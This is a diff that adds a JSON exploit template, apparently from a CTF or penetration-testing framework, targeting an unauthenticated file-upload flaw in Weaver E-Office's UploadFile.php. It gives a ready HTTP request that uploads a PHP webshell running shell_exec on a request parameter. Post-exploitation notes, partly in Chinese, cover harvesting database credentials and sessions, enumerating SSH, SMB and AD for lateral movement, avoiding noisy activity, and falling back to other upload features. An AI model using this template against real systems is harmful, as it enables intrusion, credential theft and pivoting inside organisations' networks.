@@ -1,0 +1,117 @@
+{
+  "id": "weaver-eoffice-uploadfile-file-upload",
+  "family": "oa",
+  "product": "Weaver E-Office",
+  "cve": "N/A",
+  "aliases": [
+    "泛微 E-Office uploadPicture",
+    "Weaver E-Office UploadFile"
+  ],
+  "severity": "high",
+  "tags": [
+    "oa",
+    "weaver",
+    "eoffice",
+    "file-upload",
+    "webshell"
+  ],
+  "applicability": {
+    "versions": [
+      "E-Office 9.x"
+    ],
+    "fingerprints": [
+      "Static assets, HTML titles, or cookies mention e-office / 泛微 e-office",
+      "/general/index/UploadFile.php is reachable",
+      "Target uses PHP-based OA pages rather than Java servlet routing"
+    ],
+    "signals": [
+      "uploadPicture endpoint accepts multipart data before strict authentication",
+      "Response includes saved filename, attachment id, or relative upload path",
+      "Uploaded benign files can be fetched back or referenced by the returned path"
+    ]
+  },
+  "preconditions": [
+    "The target is a Weaver E-Office deployment exposing the UploadFile entry point.",
+    "The selected upload flow is weakly protected or unauthenticated.",
+    "The upload directory is retrievable directly or can be reached through a PHP include / preview path."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"probe.gif\"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89aOA_PROBE\\r\\n------ctfboundary--\\r\\n",
+        "matchers": [
+          "Response contains attachment id, stored filename, or saved-path marker",
+          "Returned path can be used to retrieve the benign probe file"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_upload",
+    "requests": [
+      {
+        "path": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"oa.php\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n<?php echo shell_exec($_REQUEST['cmd'] ?? 'id'); ?>\\r\\n------ctfboundary--\\r\\n",
+        "os_hint": "linux"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "优先确认上传目录是否解析 PHP，或是否能借助文件包含、日志包含、模板引用把上传文件转成执行点。",
+      "如果只能文件读写，优先收集数据库连接信息、附件路径、后台用户会话与备份文件。",
+      "对多层网络题，建议把 OA 站点的 SSH、数据库、SMB、邮件或 AD 集成配置一并枚举。"
+    ],
+    "shell_options": [
+      {
+        "type": "php_webshell_write",
+        "template": "Use the uploadPicture flow to place a small PHP foothold in a reachable directory"
+      },
+      {
+        "type": "php_env_probe",
+        "template": "Use the foothold to run php_uname(), getcwd(), and print_r($_SERVER)"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先上传 benign 图片或文本，确认回读路径。",
+      "再确认目标目录是否解析 PHP，避免盲目上传脚本。",
+      "拿到 foothold 后优先转向配置、凭据和横向信息，而不是长时间用 webshell 做高噪声探测。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "php -v"
+    ],
+    "shell_prerequisites": [
+      "The landing directory must be executable as PHP or reachable through another inclusion path.",
+      "Outbound network access is required only if you plan to turn the foothold into a reverse shell."
+    ],
+    "fallbacks": [
+      "If PHP execution is disabled, use the uploaded file to test path traversal, preview, or arbitrary-read chains.",
+      "If direct upload is blocked, pivot to import, avatar, attachment, or office-template upload features in the same product."
+    ]
+  },
+  "detection_notes": [
+    "A successful upload does not guarantee code execution; the critical second step is mapping where the file landed and how the server treats that directory.",
+    "In competition targets, E-Office uploads often become the first foothold that later leads to credential recovery and internal pivoting."
+  ],
+  "references": [
+    "Public Weaver E-Office uploadPicture analyses",
+    "Common E-Office attack-chain notes involving UploadFile.php"
+  ]
+}
